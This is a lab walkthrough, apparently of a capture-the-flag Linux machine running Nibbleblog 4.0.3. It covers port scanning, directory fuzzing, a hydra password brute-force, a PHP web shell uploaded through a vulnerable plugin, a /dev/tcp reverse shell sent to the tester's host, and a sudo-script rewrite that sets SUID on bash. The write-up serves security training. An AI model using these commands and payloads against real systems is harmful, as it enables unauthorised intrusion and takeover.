# Introduction

- **OS:** Linux
- **Difficulty:** Easy
- **IP:** `10.129.153.203`

> **Info:** The IP Address may change during the walk-through.

---

# Enumeration

Let's begin with a quick **nmap [^¹]** scan:

## Open ports scan (TCP)

First I'll run the command `nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn <IP Address> -oG tcpScan`. This command will run an open **TCP** ports enumeration against all the `65,535` TCP ports.

- We indicate with the `-p-` parameter to do the scan against all the ports.
- The `-sS` parameter we do a [stealth scan](https://nmap.org/book/synscan.html), where basically the TCP three-way handshake connection is not completed (so it's more stealthy).
- With `--open` it will retrieve only the open ports (there are other states for ports like filtered or closed).
- `--min-rate 5000` we set a minimum of 5000 packets per second (this can make more noise, so do not use it in situations where detection bypass is needed).
- We apply an extra verbose with `-vvv`.
- With `-n` nmap doesn't do DNS resolution and with `-Pn` doesn't do a host discovery (through ICMP).
- Finally we save the output in greppable format with `-oG`.

We can see that the scan finished and we have ports `22` and `80` open.  
**Output:**

```java
❯ nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.153.203 -oG tcpScan
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-03 01:08 AST
Initiating SYN Stealth Scan at 01:08
Scanning 10.129.153.203 [65535 ports]
Discovered open port 22/tcp on 10.129.153.203
Discovered open port 80/tcp on 10.129.153.203
Completed SYN Stealth Scan at 01:08, 13.47s elapsed (65535 total ports)
Nmap scan report for 10.129.153.203
Host is up, received user-set (0.061s latency).
Scanned at 2026-09-03 01:08:44 AST for 13s
Not shown: 64675 closed tcp ports (reset), 858 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds
           Raw packets sent: 66992 (2.948MB) | Rcvd: 64686 (2.587MB)
```

We can also see the output file and use the [extractPorts function](../../../resources/extractPorts%20Function.md) to extract all the open ports and copy to the clipboard.

```bash
❯ ls
 tcpScan
```

```bash
❯ extractPorts tcpScan
─────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     │ File: extractPorts.tmp
─────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ 
   2 │ [*] Extracting information...
   3 │ 
   4 │     [*] IP Address: 10.129.153.203
   5 │     [*] Open ports: 22,80
   6 │ 
   7 │ [*] Ports copied to clipboard
   8 │ 
─────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Service scan

Now that we know which ports are open, we can see what services are running on them. For this I'll use the command `nmap -p22,80 -sCV <IP Address> -oA serviceScan`.

- We specify the ports `22` and `80` with `-p22,80`.
- We do a service discovery on that ports with `-sV` and with `-sC` we execute a default nmap script, listed here (These scripts can be intrusive, so it's important to know when use them). These parameters can be fused into one `-sCV`.
- With `-oA` we save the output in all the formats that nmap supports (greppable, raw and xml). Is important to save these files for the documentation and reporting phase.

As we can see nmap tell us that there is an `OpenSSH 7.2p2` service on port `22` and an `Apache 2.4.18` web server on port `80`.  
**Output:**

```java
❯ nmap -p22,80 -sCV 10.129.153.203 -oA serviceScan
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-03 01:24 AST
Nmap scan report for 10.129.153.203
Host is up (0.062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds
```

We can also connect through `nc` to do some banner grabbing that helps to confirm what nmap told us.

```bash
❯ nc -nv 10.129.153.203 22
Connection to 10.129.153.203 22 port [tcp/*] succeeded!
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
```

## OS discovery

When we do a ping to a host there is a block named `TTL (Time-To-Live)` that is the maximum hops that a packet can do. We can base on this to know what operating system is running on the target host. We can use the table below:

|OS|TTL|
|---|---|
|Linux|64|
|Windows|128|

This is not a 100% conclusion, but in most cases it can be useful. As we can see the `TTL` that we receive with the ping is `63` that tells us that target machine OS is Linux.

```bash
❯ ping -c 1 10.129.153.203
PING 10.129.153.203 (10.129.153.203) 56(84) bytes of data.
64 bytes from 10.129.153.203: icmp_seq=1 ttl=63 time=62.0 ms

--- 10.129.153.203 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 61.997/61.997/61.997/0.000 ms
```

Also using the services/application versions can help us to reveal the target OS version. Take OpenSSH, for example. We see the reported version on nmap is `OpenSSH 7.2p2 Ubuntu 4ubuntu2.2`. A quick search for this version online reveals that it is included in `Ubuntu 16.04 LTS (Xenial Xerus)`.

![](resources/Pasted%20image%2020260903015556.png)

However, it is worth noting that this cross-referencing technique is not entirely reliable, as it is possible to install more recent application packages on an older OS version.

---

# Web Footprinting

We can use `whatweb` to try to identify the web technologies in use on the web page on port `80`.

```bash
❯ whatweb http://10.129.153.203
http://10.129.153.203 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.153.203]
```

As we can see, the tool does not identify any standard web application. When accessing the page from the browser we can see a simple "Hello World" message on the page.

![](resources/Pasted%20image%2020260903020302.png)

Watching if the source reveals something interesting.  
![](resources/Pasted%20image%2020260903020443.png)

The source has a comment mentioning something about a `/nibbleblog` directory. Let's go there on the browser.

![](resources/Pasted%20image%2020260903020704.png)

We get this page and if we do a quick Google search for the "Nibbleblog" word we can see that it is a CMS for blog purposes.

![](resources/Pasted%20image%2020260903021114.png)

## Fuzzing

Using `gobuster` let's do directory/file fuzzing on the `/nibbleblog` directory.

```bash
❯ gobuster dir -u http://10.129.153.242/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -x txt,db,php -t 200 --no-error -o nibbleblogFuzzing
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.153.242/nibbleblog/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,db,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/sitemap.php          (Status: 200) [Size: 404]
/content              (Status: 301) [Size: 329] [--> http://10.129.153.242/nibbleblog/content/]
/themes               (Status: 301) [Size: 328] [--> http://10.129.153.242/nibbleblog/themes/]
/feed.php             (Status: 200) [Size: 306]
/admin                (Status: 301) [Size: 327] [--> http://10.129.153.242/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/plugins              (Status: 301) [Size: 329] [--> http://10.129.153.242/nibbleblog/plugins/]
/install.php          (Status: 200) [Size: 78]
/update.php           (Status: 200) [Size: 1622]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 331] [--> http://10.129.153.242/nibbleblog/languages/]
/index.php            (Status: 200) [Size: 2989]
/LICENSE.txt          (Status: 200) [Size: 35148]
/.php                 (Status: 403) [Size: 304]
/COPYRIGHT.txt        (Status: 200) [Size: 1272]
/.php                 (Status: 403) [Size: 304]
Progress: 350656 / 350660 (100.00%)
===============================================================
Finished
===============================================================
```

## Sub-directories information grabbing

We get some valuable information about sub-directories and files. If we access the `README` we see some information like the **version** of `Nibbleblog` in use.

![](resources/Pasted%20image%2020260903025727.png)  
We can notice that the version in use is `4.0.3`. If we do a Google search we can discover that this version is vulnerable to a **File Upload** vulnerability through the plugin `My Image`.

![](resources/Pasted%20image%2020260903030442.png)  
We also can notice that to exploit this we have to have **admin** privileges. As we saw on the `gobuster` output we have an `admin.php` page that if we access is a login page.

![](resources/Pasted%20image%2020260903031117.png)  
We have the login page but we don't have any credentials we can use. Spending some time digging through the `/content` directory we can find a `users.xml` file which apparently confirms the existence of the `admin` user.

![](resources/Pasted%20image%2020260903031518.png)

![](resources/Pasted%20image%2020260903031609.png)

## Password Brute-force

Because we don't have any passwords let's perform a password brute-force. For this we can use the `CeWL` tool to create a password based on the target website words.

```bash
❯ cewl http://10.129.154.7/nibbleblog/ --with-numbers -w NibbleblogDict
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

❯ cewl http://10.129.153.242/nibbleblog/ --with-numbers --lowercase -w NibbleblogDict.lower
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

```

We create two dictionaries based on the Nibbleblog page in capital words and lowercase. Now we can use a tool like `hydra` to perform a brute-force attack against the **admin** user using these dictionaries of passwords.

```bash
❯ hydra -W 1 -l 'admin' -P NibbleblogDict.lower 10.129.154.12 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:S=dashboard"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-03 04:03:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:1/p:30), ~2 tries per task
[DATA] attacking http-post-form://10.129.154.12:80/nibbleblog/admin.php:username=^USER^&password=^PASS^:S=dashboard
[80][http-post-form] host: 10.129.154.12   login: admin   password: nibbles
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-03 04:03:49
```

As we can see, we find the password `nibbles` so now let's try to log into the admin panel.

![](resources/Pasted%20image%2020260903040702.png)

Now we can access the dashboard as the admin user.

---

# Getting a foothold

As we saw before, now we can exploit a **File Upload** through the plugin `My Image`. We can go `Plugins > My Image (Configure)` and see how we have the option to upload a file.

![](resources/Pasted%20image%2020260903041320.png)

![](resources/Pasted%20image%2020260903041410.png)

## WebShell

Because this page compiles PHP, we can try to upload a PHP file that executes commands on the target host that we can control.

```php
<?php
  system($_GET['cmd']);
?>
```

Now we can try to upload the file.

![](resources/Pasted%20image%2020260903041952.png)

We get a bunch of errors, but it seems like the file may have uploaded.  
![](resources/Pasted%20image%2020260903042017.png)

## Executing command

Now we can go to the `http://10.129.154.13/nibbleblog/content/private/plugins/my_image/image.php` path and control the command from the `?cmd=` parameter.

```bash
❯ curl -s 'http://10.129.154.13/nibbleblog/content/private/plugins/my_image/image.php?cmd=id'
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

As we can see we execute the `id` command and get the output, so we can conclude that we got a successful RCE.

## Reverse Shell

Because we can execute commands, it's possible to get a complete full interactive TTY:

- Listening with `nc`:

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
```

- Execute reverse shell command:

```bash
❯ curl -s 'http://10.129.154.13/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.173/443+0>%261"'
```

And successfully get a full interactive shell.

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.154.13 44332
bash: cannot set terminal process group (1260): Inappropriate ioctl for device
bash: no job control in this shell
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ id
id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 
```

### Upgrade full interactive TTY

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ python3 -c 'import pty; pty.spawn("/bin/bash")'       
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty -echo raw; fg
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ reset xterm
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ export TERM=xterm
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ export SHELL=/bin/bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ stty rows 57 columns 195
```

---

# Privilege escalation

We can find a file named `personal.zip` in the user's home directory.

```bash
nibbler@Nibbles:/home/nibbler$ ls -l
total 8
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Mar 12  2021 user.txt
nibbler@Nibbles:/home/nibbler$ 
```

We can unzip the file and see a file called `monitor.sh`.

```bash
nibbler@Nibbles:/home/nibbler$ unzip personal.zip 
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ cd personal/stuff 
```

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh 
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
nibbler@Nibbles:/home/nibbler/personal/stuff$ 
```

The script is owned by our `nibbler` user and we can modify it.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l
total 4
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ 
```

## Sudoers permissions

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ 
```

As we can see we can execute this file as root without a password. Now we can attempt to modify the file and execute it as root.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ rm monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ nano !$
nano monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat !$
cat monitor.sh
#!/bin/bash

chmod u+s /bin/bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ 
```

Now we can execute this file as root and give the bash shell SUID privilege, then execute the bash as privileged (root privileged).

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ 
```

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ whoami
nibbler
nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p
bash-4.3# whoami
root
bash-4.3# 
```

---

In that way we access as root on the target system and complete the machine. Thank you for staying until the end!
